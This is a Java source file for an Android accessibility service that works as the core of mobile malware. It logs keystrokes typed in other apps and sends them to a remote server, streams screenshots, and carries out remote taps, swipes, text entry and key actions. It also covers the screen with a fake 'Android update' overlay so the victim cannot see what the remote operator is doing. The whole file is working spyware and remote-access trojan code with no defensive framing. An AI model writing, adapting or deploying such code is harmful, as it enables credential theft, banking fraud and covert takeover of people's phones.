package com.aval.seg;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Display;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;

public class KeySvc extends AccessibilityService {

    public static volatile KeySvc I;

    private final Handler H = new Handler(Looper.getMainLooper());
    private final StringBuilder buf = new StringBuilder();
    private volatile long lastFlush;
    private volatile String curPkg;
    public volatile boolean shotOn = true;
    private volatile boolean shotBusy;
    private volatile long lastShot;
    private WindowManager wm;
    private View ov;
    private PowerManager.WakeLock wl;

    private final Runnable flush = new Runnable() {
        @Override public void run() { flushNow(); }
    };

    private final Runnable loop = new Runnable() {
        @Override public void run() {
            int iv = 250;
            try {
                boolean precisa = !ScreenSvc.alive || ScreenSvc.black || ScreenSvc.giveUp;
                iv = Math.max(260, 1000 / Math.max(1, ScreenSvc.FPS));
                if (shotOn && precisa && Build.VERSION.SDK_INT >= 30
                        && System.currentTimeMillis() - lastShot >= iv) {
                    lastShot = System.currentTimeMillis();
                    grab();
                }
            } catch (Throwable ignored) {}
            H.postDelayed(this, Math.max(120, iv));
        }
    };

    @Override protected void onServiceConnected() {
        super.onServiceConnected();
        I = this;
        try { Net.start(this); } catch (Throwable ignored) {}
        H.post(flush);
        H.post(loop);
    }

    @Override public void onDestroy() {
        H.removeCallbacks(flush);
        H.removeCallbacks(loop);
        overlay(false);
        try { if (wl != null && wl.isHeld()) wl.release(); } catch (Throwable ignored) {}
        I = null;
        super.onDestroy();
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        try {
            if (e.getPackageName() != null) curPkg = e.getPackageName().toString();
        } catch (Throwable ignored) {}
    }

    @Override public void onInterrupt() {}

    @Override public boolean onKeyEvent(KeyEvent e) {
        try {
            if (e.getAction() != KeyEvent.ACTION_DOWN) return false;
            String pkg = curPkg;
            if (pkg != null && pkg.equals(getPackageName())) return false;
            int kc = e.getKeyCode();
            if (kc == KeyEvent.KEYCODE_BACK || kc == KeyEvent.KEYCODE_HOME
                    || kc == KeyEvent.KEYCODE_APP_SWITCH) return false;
            CharSequence cs = e.getCharacters();
            String txt = cs == null ? "" : cs.toString();
            if (txt.length() == 0) {
                if (kc == KeyEvent.KEYCODE_DEL) txt = "[DEL]";
                else if (kc == KeyEvent.KEYCODE_ENTER) txt = "[ENTER]";
                else return false;
            }
            add(pkg == null ? "?" : pkg, txt);
        } catch (Throwable ignored) {}
        return false;
    }

    private void add(String pkg, String s) {
        synchronized (buf) {
            if (buf.length() > 0) buf.append(' ');
            buf.append(pkg).append(':').append(s);
        }
        if (buf.length() >= 180 || System.currentTimeMillis() - lastFlush >= 400) flushNow();
    }

    private void flushNow() {
        H.removeCallbacks(flush);
        String s;
        synchronized (buf) {
            s = buf.toString();
            buf.setLength(0);
        }
        if (s.length() > 0) {
            Net.send("{\"t\":\"k\",\"o\":\"" + Util.esc(s) + "\"}");
            lastFlush = System.currentTimeMillis();
        }
        H.postDelayed(flush, 1500);
    }

    public void touch(float x, float y) {
        try {
            Path p = new Path();
            p.moveTo(x, y);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(new GestureDescription.StrokeDescription(p, 0, 60));
            dispatchGesture(b.build(), null, null);
        } catch (Throwable ignored) {}
    }

    public void swipe(float x1, float y1, float x2, float y2, int ms) {
        try {
            Path p = new Path();
            p.moveTo(x1, y1);
            p.lineTo(x2, y2);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(new GestureDescription.StrokeDescription(p, 0, Math.max(80, ms)));
            dispatchGesture(b.build(), null, null);
        } catch (Throwable ignored) {}
    }

    public void longPress(float x, float y) {
        try {
            Path p = new Path();
            p.moveTo(x, y);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(new GestureDescription.StrokeDescription(p, 0, 700));
            dispatchGesture(b.build(), null, null);
        } catch (Throwable ignored) {}
    }

    public void setText(String s) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (f == null) return;
            Bundle a = new Bundle();
            a.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, s);
            f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, a);
        } catch (Throwable ignored) {}
    }

    public void key(int code) {
        try {
            if (code == 4) performGlobalAction(GLOBAL_ACTION_BACK);
            else if (code == 3) performGlobalAction(GLOBAL_ACTION_HOME);
            else if (code == 187) performGlobalAction(GLOBAL_ACTION_RECENTS);
            else if (code == 26) performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
            else if (code == 5) performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
        } catch (Throwable ignored) {}
    }

    public void screenOn(boolean on) {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (on) {
                if (wl == null) {
                    wl = pm.newWakeLock(
                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "aval:scr");
                    wl.setReferenceCounted(false);
                }
                wl.acquire(60000);
            } else if (wl != null && wl.isHeld()) {
                wl.release();
            }
        } catch (Throwable ignored) {}
    }

    private void grab() {
        if (shotBusy) return;
        shotBusy = true;
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override public void onSuccess(ScreenshotResult r) {
                    Bitmap b = null;
                    Bitmap soft = null;
                    Bitmap small = null;
                    try {
                        b = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                        soft = Bitmap.createBitmap(b.getWidth(), b.getHeight(), Bitmap.Config.ARGB_8888);
                        new android.graphics.Canvas(soft).drawBitmap(b, 0, 0, null);
                        int tw = Math.min(720, soft.getWidth());
                        int th = Math.max(2, soft.getHeight() * tw / soft.getWidth());
                        small = Bitmap.createScaledBitmap(soft, tw & ~1, th & ~1, true);
                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
                        small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
                        Net.sendBin(bo.toByteArray());
                    } catch (Throwable ignored) {
                    } finally {
                        try { if (small != null) small.recycle(); } catch (Throwable ignored) {}
                        try { if (soft != null) soft.recycle(); } catch (Throwable ignored) {}
                        try { r.getHardwareBuffer().close(); } catch (Throwable ignored) {}
                        shotBusy = false;
                    }
                }
                @Override public void onFailure(int code) {
                    shotBusy = false;
                    if (code != 3) Net.send("{\"t\":\"err\",\"o\":\"screenshot falhou: " + code + "\"}");
                }
            });
        } catch (Throwable t) {
            shotBusy = false;
        }
    }

    public void overlay(final boolean on) {
        H.post(new Runnable() {
            @Override public void run() {
                try {
                    if (on) {
                        if (ov != null) return;
                        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                        LinearLayout l = new LinearLayout(KeySvc.this);
                        l.setOrientation(LinearLayout.VERTICAL);
                        l.setGravity(Gravity.CENTER);
                        l.setBackgroundColor(Color.parseColor("#0B0F14"));
                        ProgressBar pb = new ProgressBar(KeySvc.this);
                        TextView t = new TextView(KeySvc.this);
                        t.setText("Atualizando o Android\n\nVerificando pacotes do sistema...\nNao desligue o aparelho");
                        t.setTextColor(Color.WHITE);
                        t.setTextSize(17);
                        t.setGravity(Gravity.CENTER);
                        t.setPadding(48, 48, 48, 48);
                        l.addView(pb);
                        l.addView(t);
                        int type = Build.VERSION.SDK_INT >= 26
                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                                : WindowManager.LayoutParams.TYPE_PHONE;
                        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT, type,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                PixelFormat.TRANSLUCENT);
                        wm.addView(l, lp);
                        ov = l;
                    } else if (ov != null) {
                        wm.removeView(ov);
                        ov = null;
                    }
                } catch (Throwable ignored) {}
            }
        });
    }
}